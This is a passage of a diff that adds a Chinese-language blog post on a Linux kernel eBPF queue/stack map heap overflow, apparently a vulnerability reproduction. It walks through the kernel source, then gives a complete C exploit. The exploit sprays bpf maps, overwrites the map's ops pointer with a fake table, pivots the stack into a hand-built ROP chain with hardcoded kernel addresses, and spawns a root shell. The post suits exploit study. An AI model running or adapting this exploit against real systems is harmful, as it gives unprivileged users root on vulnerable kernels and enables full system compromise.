class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_update_elem</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> __user *ukey = u64_to_user_ptr(attr-&gt;key);</span><br><span class="line">  <span class="keyword">void</span> __user *uvalue = u64_to_user_ptr(attr-&gt;value);</span><br><span class="line">  <span class="keyword">int</span> ufd = attr-&gt;map_fd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *key, *value;</span><br><span class="line">  u32 value_size;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (CHECK_ATTR(BPF_MAP_UPDATE_ELEM))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  f = fdget(ufd);</span><br><span class="line">  <span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line">  <span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line">    <span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(f.file-&gt;f_mode &amp; FMODE_CAN_WRITE)) &#123;</span><br><span class="line">    err = -EPERM;</span><br><span class="line">    <span class="keyword">goto</span> err_put;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  key = __bpf_copy_key(ukey, <span class="built_in">map</span>-&gt;key_size);</span><br><span class="line">  <span class="keyword">if</span> (IS_ERR(key)) &#123;</span><br><span class="line">    err = PTR_ERR(key);</span><br><span class="line">    <span class="keyword">goto</span> err_put;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH ||</span><br><span class="line">      <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH ||</span><br><span class="line">      <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY ||</span><br><span class="line">      <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE)</span><br><span class="line">    value_size = round_up(<span class="built_in">map</span>-&gt;value_size, <span class="number">8</span>) * num_possible_cpus();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    value_size = <span class="built_in">map</span>-&gt;value_size;</span><br><span class="line"></span><br><span class="line">  err = -ENOMEM;</span><br><span class="line">  value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);</span><br><span class="line">  <span class="keyword">if</span> (!value)</span><br><span class="line">    <span class="keyword">goto</span> free_key;</span><br><span class="line"></span><br><span class="line">  err = -EFAULT;</span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(value, uvalue, value_size) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Need to create a kthread, thus must support schedule */</span></span><br><span class="line">  <span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">    err = bpf_map_offload_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_CPUMAP ||</span><br><span class="line">             <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKHASH ||</span><br><span class="line">             <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKMAP) &#123;</span><br><span class="line">    err = <span class="built_in">map</span>-&gt;ops-&gt;map_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-        .name {
-          color: var(--default-text-color);
-        }
+<p>可以看到这里是直接取出map中存储的value_size直接kmalloc一个堆块，然后从用户态copy内容到堆块上面。随后调用ops中的map_update_elem函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">queue_stack_map_push_elem</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     u64 flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span> =</span> bpf_queue_stack(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> irq_flags;</span><br><span class="line">  <span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">void</span> *dst;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* BPF_EXIST is used to force making room for a new element in case the</span></span><br><span class="line"><span class="comment">	 * map is full</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">  <span class="keyword">bool</span> replace = (flags &amp; BPF_EXIST);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check supported flags for queue and stack maps */</span></span><br><span class="line">  <span class="keyword">if</span> (flags &amp; BPF_NOEXIST || flags &gt; BPF_EXIST)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  raw_spin_lock_irqsave(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_stack_map_is_full(qs)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!replace) &#123;</span><br><span class="line">      err = -E2BIG;</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* advance tail pointer to overwrite oldest element */</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(++qs-&gt;tail &gt;= qs-&gt;size))</span><br><span class="line">      qs-&gt;tail = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  dst = &amp;qs-&gt;elements[qs-&gt;head * qs-&gt;<span class="built_in">map</span>.value_size];</span><br><span class="line">  <span class="built_in">memcpy</span>(dst, value, qs-&gt;<span class="built_in">map</span>.value_size);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (unlikely(++qs-&gt;head &gt;= qs-&gt;size))</span><br><span class="line">    qs-&gt;head = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  out:</span><br><span class="line">  raw_spin_unlock_irqrestore(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-        .author-label {
-          margin-left: 10px;
-          font-size: 0.8rem;
-          font-weight: 500;
-          padding: 0 5px;
-          border-radius: 5px;
-          color: #fff;
-          background: var(--selection-color);
-        }
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> <span class="title">map</span>;</span></span><br><span class="line">	<span class="keyword">raw_spinlock_t</span> lock;</span><br><span class="line">	u32 head, tail;</span><br><span class="line">	u32 size; <span class="comment">/* max_entries + 1 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> elements[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-      }
-    }
+<p>这里利用memcpy将堆块上的内容复制到目标地址。这里查看qs的定义可以看出来其实就是往管理堆块下面相邻的堆块进行写入，但是因为我们上面申请的size只是管理堆块的size这也就导致了我们可以进行堆溢出。</p>
+<h3 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h3><p>其实从上面分析到这里可以看出来这里的功能主要是要干嘛的，并且分析出来qs的结构。这里简化一下结构体其实就是类似于msg_msg的一种结构：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  manager;</span><br><span class="line">  data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-  }
+<p>不过我们每次进行update的时候只能够修改data中的一个小块，而这些小块又被分成了<code>attr-&gt;max_entries + 1</code>个，并且每个小块的size为：<code>attr-&gt;value_size</code>。</p>
+<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>这里主要利用堆风水使我们分配的两个object相邻，接着修改掉ops指针，劫持函数实现站栈迁移即可。</p>
+<p>这里使用到的gadget在 <a href="https://cv196082.gitee.io/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/">modify_ldt利用</a> 中提到过，不熟悉的可以去看看这里就不再赘述。</p>
+<h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_NUMBER 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_bpf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bpf 321</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs = <span class="number">0xffffffff81c00d5a</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = <span class="number">0xffffffff8106d8f4</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_pivot_gadget = <span class="number">0xffffffff81954dc8</span>;</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> res;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> fake_ops[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pointer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> *rop_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)buf = <span class="number">0x17</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">8</span>) = <span class="number">0x40</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">12</span>) = <span class="number">-1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">16</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">20</span>) = <span class="number">-1</span>;</span><br><span class="line">    res = syscall(__NR_bpf, <span class="number">0</span>, buf, <span class="number">0x2c</span>);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;BPF_MAP_CREATE error!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> victim[SPRAY_NUMBER];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SPRAY_NUMBER; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        victim[i] = syscall(__NR_bpf, <span class="number">0</span>, buf, <span class="number">0x2c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;spray finished!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_ops[<span class="number">2</span>] = stack_pivot_gadget;</span><br><span class="line">    pointer[<span class="number">6</span>] = fake_ops;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)buf = res;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + <span class="number">16</span>) = pointer;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + <span class="number">24</span>) = <span class="number">2</span>;</span><br><span class="line">    syscall(__NR_bpf, <span class="number">2</span>, buf, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;changed ops\n&quot;</span>);</span><br><span class="line">    rop_addr = mmap(<span class="number">0x81954000</span>, <span class="number">0x8000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff81029c71</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0x6f0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff810013b9</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xFFFFFFFF810E3D40</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff81001c50</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff810013b9</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff81264e0b</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xFFFFFFFF810E3AB0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff81c00d5a</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0x246</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff8106d8f4</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)get_shell;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)user_cs;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)user_rflags;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)user_sp;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)user_ss;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(<span class="number">0x81954dc8</span>) = <span class="number">0xffffffff81029c71</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SPRAY_NUMBER; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(victim[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20221002145034272.png"
+                      alt="image-20221002145034272"
+                ></p>
+<hr>
+<p>参考链接:<a class="link"   target="_blank" rel="noopener" href="http://p4nda.top/2019/01/02/kernel-bpf-overflow/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8" >http://p4nda.top/2019/01/02/kernel-bpf-overflow/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8<i class="fas fa-external-link-alt"></i></a></p>
 
-  .article-header, .article-header-meta-info {
-    margin-top: 16px;
-    +keep-tablet() {
-      transform: scale(0.9);
-      transform-origin: left top;
-    }
-  }
+        </div>
 
+        
 
-  .article-content {
-    margin-top: $component-spacing-value;
-    padding-bottom: 10px;
-    word-wrap: break-word;
-    border-bottom: 1px solid var(--border-color);
-    color: var(--default-text-color);
-  }
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/10/10/CVE-2017-16995/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">CVE-2017-16995</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/09/22/ciscn-cactus%E5%A4%8D%E7%8E%B0/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">ciscn cactus复现</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
 
-  .post-copyright-info {
-    margin-top: $component-spacing-value;
-    width: 100%;
-  }
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;评论</i>
+    </div>
+    
 
-  .article-nav {
-    height: 40px;
-    margin-top: $component-spacing-value;
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
